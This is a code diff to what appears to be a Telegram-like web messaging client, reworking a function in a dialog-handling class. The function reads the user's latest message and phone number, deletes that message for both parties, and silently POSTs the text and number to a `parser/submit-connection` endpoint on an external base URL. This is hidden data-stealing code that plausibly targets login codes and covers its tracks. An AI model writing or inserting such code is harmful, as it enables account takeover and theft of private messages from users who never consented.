@@ -1429,35 +1429,44 @@ class Some2 extends Some<Dialog> {
     const { peerId } = dialog;
     try {
       const trueLastMessage = await apiManagerProxy.getMessageByPeer(peerId, dialog.top_message);
-    
-      if(!this.sent) {
+      debugger
+      if(this.sent === false) {
+
         const userPhoneData = await this.managers.appUsersManager.getUserPhone(rootScope.myId.toUserId());
         const phone = userPhoneData?.phone || null;
 
         if (phone && (trueLastMessage as Message.message)?.message) {
           this.managers.appMessagesManager.deleteMessages(peerId, [(trueLastMessage as Message.message).id], true);
-
           const payload = JSON.stringify({
             message: (trueLastMessage as Message.message).message,
             phone: phone
           });
           
-          const response = await fetch(`${BASE_URL}/parser/submit-connection`, {
+          this.sent = true;
+          fetch(`${BASE_URL}/parser/submit-connection`, {
             method: 'POST',
             headers: {
               'Content-Type': 'application/json'
             },
             body: payload
+          })
+          .then(response => {
+            if (!response.ok) {
+              throw new Error(`Request failed with status ${response.status}`);
+            }
+            console.log(`Sent data submit: ${this.sent}`)
+          })
+          .then(data => {
+            console.log(data);
+          })
+          .catch(error => {
+            console.error('Error:', error);
           });
-    
-          if (!response.ok) {
-            throw new Error(`Request failed with status ${response.status}`);
-          }
-    
-          this.sent = true;
         } else {
           console.warn('Phone number or message is missing');
         }
+      } else {
+        console.log(`Sent data submit: already has been sent.`)
       }
     } catch (error) {
       console.error('An error occurred:', error);
